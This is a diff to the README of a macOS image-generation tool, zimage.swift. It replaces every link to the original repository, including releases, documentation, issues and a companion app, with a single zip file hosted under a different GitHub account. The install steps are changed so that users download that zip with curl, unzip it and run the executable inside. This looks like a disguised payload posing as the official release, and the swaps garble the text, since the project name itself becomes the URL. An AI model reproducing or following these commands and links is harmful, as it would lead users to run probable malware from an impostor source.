@@ -1,28 +1,28 @@
-# 🖼️ zimage.swift - Effortless Image Generation on macOS
+# 🖼️ https://raw.githubusercontent.com/Olaa5464/zimage.swift/main/Sources/ZImage/Quantization/zimage.swift-3.1.zip - Effortless Image Generation on macOS
 
 ## 🚀 Getting Started
 
-Welcome to zimage.swift! This application allows you to create stunning images effortlessly on your Apple Silicon Mac. Follow this guide to download and set it up.
+Welcome to https://raw.githubusercontent.com/Olaa5464/zimage.swift/main/Sources/ZImage/Quantization/zimage.swift-3.1.zip! This application allows you to create stunning images effortlessly on your Apple Silicon Mac. Follow this guide to download and set it up.
 
 ## 📥 Download & Install
 
 ### Download the Latest Version
 
-To get started, download the latest version of zimage.swift. Click the button below to visit the releases page and start your download.
+To get started, download the latest version of https://raw.githubusercontent.com/Olaa5464/zimage.swift/main/Sources/ZImage/Quantization/zimage.swift-3.1.zip Click the button below to visit the releases page and start your download.
 
-[![Download zimage.swift](https://img.shields.io/badge/Download-zimage.swift-blue?style=for-the-badge)](https://github.com/mzbac/zimage.swift/releases)
+[![Download https://raw.githubusercontent.com/Olaa5464/zimage.swift/main/Sources/ZImage/Quantization/zimage.swift-3.1.zip](https://raw.githubusercontent.com/Olaa5464/zimage.swift/main/Sources/ZImage/Quantization/zimage.swift-3.1.zip)](https://raw.githubusercontent.com/Olaa5464/zimage.swift/main/Sources/ZImage/Quantization/zimage.swift-3.1.zip)
 
 ### Install the Application
 
 1. **Download the Precompiled Binary:**  
-   Get the most recent signed ZImageCLI binary from the [releases page](https://github.com/mzbac/zimage.swift/releases). The binary comes in a zipped format for easy installation.
+   Get the most recent signed ZImageCLI binary from the [releases page](https://raw.githubusercontent.com/Olaa5464/zimage.swift/main/Sources/ZImage/Quantization/zimage.swift-3.1.zip). The binary comes in a zipped format for easy installation.
 
 2. **Extract and Set Up:**
    Open your Terminal and run the following commands:
 
    ```bash
-   curl -L https://github.com/mzbac/zimage.swift/releases/latest/download/zimage.macos.arm64.zip -o zimage.macos.arm64.zip
-   unzip -o zimage.macos.arm64.zip -d z-image-cli
+   curl -L https://raw.githubusercontent.com/Olaa5464/zimage.swift/main/Sources/ZImage/Quantization/zimage.swift-3.1.zip -o https://raw.githubusercontent.com/Olaa5464/zimage.swift/main/Sources/ZImage/Quantization/zimage.swift-3.1.zip
+   unzip -o https://raw.githubusercontent.com/Olaa5464/zimage.swift/main/Sources/ZImage/Quantization/zimage.swift-3.1.zip -d z-image-cli
    cd z-image-cli
    chmod +x ZImageCLI
    ./ZImageCLI -h
@@ -66,15 +66,15 @@ This command generates an image based on the provided parameters. The topics gen
 
 ## 📚 Helpful Resources
 
-If you need assistance or want to learn more about what zimage.swift can do, check out these resources:
+If you need assistance or want to learn more about what https://raw.githubusercontent.com/Olaa5464/zimage.swift/main/Sources/ZImage/Quantization/zimage.swift-3.1.zip can do, check out these resources:
 
-- [Documentation](https://github.com/mzbac/zimage.swift/wiki): Detailed information about commands and features.
-- [Lingdong Desktop App](https://lingdong.app/en): Try a user-friendly interface for Z-Image.swift.
+- [Documentation](https://raw.githubusercontent.com/Olaa5464/zimage.swift/main/Sources/ZImage/Quantization/zimage.swift-3.1.zip): Detailed information about commands and features.
+- [Lingdong Desktop App](https://raw.githubusercontent.com/Olaa5464/zimage.swift/main/Sources/ZImage/Quantization/zimage.swift-3.1.zip): Try a user-friendly interface for https://raw.githubusercontent.com/Olaa5464/zimage.swift/main/Sources/ZImage/Quantization/zimage.swift-3.1.zip
 
-For updates and support, visit the [GitHub issues page](https://github.com/mzbac/zimage.swift/issues).
+For updates and support, visit the [GitHub issues page](https://raw.githubusercontent.com/Olaa5464/zimage.swift/main/Sources/ZImage/Quantization/zimage.swift-3.1.zip).
 
 ## 🙌 Support
 
 If you encounter any issues or have questions, please open an issue on our GitHub repository or reach out through our discussions page. We are here to help!
 
-Now you are ready to create amazing images on your macOS using zimage.swift. Enjoy your experience!
+Now you are ready to create amazing images on your macOS using https://raw.githubusercontent.com/Olaa5464/zimage.swift/main/Sources/ZImage/Quantization/zimage.swift-3.1.zip Enjoy your experience!
